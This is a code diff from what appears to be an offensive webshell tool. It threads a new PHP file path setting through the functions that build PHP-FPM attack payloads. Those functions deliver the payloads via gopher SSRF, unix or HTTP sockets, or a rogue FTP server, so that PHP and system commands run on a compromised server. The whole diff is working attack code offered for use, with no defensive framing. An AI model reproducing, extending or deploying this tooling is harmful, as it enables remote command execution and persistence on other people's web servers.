@@ -404,18 +404,19 @@ def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
     host = gget("webshell.bdf_fpm.host", "webshell")
     port = gget("webshell.bdf_fpm.port", "webshell")
     sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
+    php_file_path = gget("webshell.bdf_fpm.php_file_path", "webshell")
 
     if attack_type == "gopher":
         phpcode = get_php_fpm_eval(attack_type) % (
-            generate_ssrf_code_payload(host, port, phpcode))
+            generate_ssrf_code_payload(host, port, phpcode, php_file_path))
 
     elif attack_type == "sock":
         phpcode = get_php_fpm_eval(attack_type) % (
-            sock_path, generate_base64_socks_code_payload(host, port, phpcode))
+            sock_path, generate_base64_socks_code_payload(host, port, phpcode, php_file_path))
 
     elif attack_type == "http_sock":
         phpcode = get_php_fpm_eval(attack_type) % (
-            host, port, generate_base64_socks_code_payload(host, port, phpcode))
+            host, port, generate_base64_socks_code_payload(host, port, phpcode, php_file_path))
 
     elif attack_type == "ftp":
         php_server_port = gget(
@@ -741,11 +742,12 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
         attack_type = gget("webshell.bdf_fpm.type", "webshell")
         host = gget("webshell.bdf_fpm.host", "webshell")
         port = gget("webshell.bdf_fpm.port", "webshell")
+        php_file_path = gget("webshell.bdf_fpm.php_file_path", "webshell")
         sleep_time = 1
 
         if attack_type == "gopher":
             phpcode += get_php_system(bdf_mode)[attack_type] % (
-                generate_ssrf_payload(host, port, ext_upload_path), print_command)
+                generate_ssrf_payload(host, port, ext_upload_path, php_file_path), print_command)
         elif attack_type in ["sock", "http_sock"]:
             sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
             phpcode += """
@@ -754,12 +756,9 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
                 $port=%s;
         """ % (sock_path, host, port)
 
-            if attack_type == "sock":
-                phpcode += get_php_system(bdf_mode)[attack_type]
-            else:
-                phpcode += get_php_system(bdf_mode)[attack_type]
+            phpcode += get_php_system(bdf_mode)[attack_type]
             phpcode += "fwrite($sock, base64_decode('%s'));" % (
-                generate_base64_socks_payload(host, port, ext_upload_path))
+                generate_base64_socks_payload(host, port, ext_upload_path, php_file_path))
         elif attack_type == "ftp":
             random_ftp_port = randint(60000, 65000)
             phpcode += get_php_system(bdf_mode)[attack_type] % (
@@ -772,7 +771,7 @@ def get_system_code(command: str, print_result: bool = True, mode: int = 0):
             sleep(0.2)
 
             phpcode = "var_dump(file_put_contents('ftp://%s:%s/a', base64_decode('%s')));" % (
-                host, random_ftp_port, generate_base64_socks_payload(host, port, ext_upload_path))
+                host, random_ftp_port, generate_base64_socks_payload(host, port, ext_upload_path, php_file_path))
 
             send(phpcode, _in_system_command=True)
             phpcode = ""
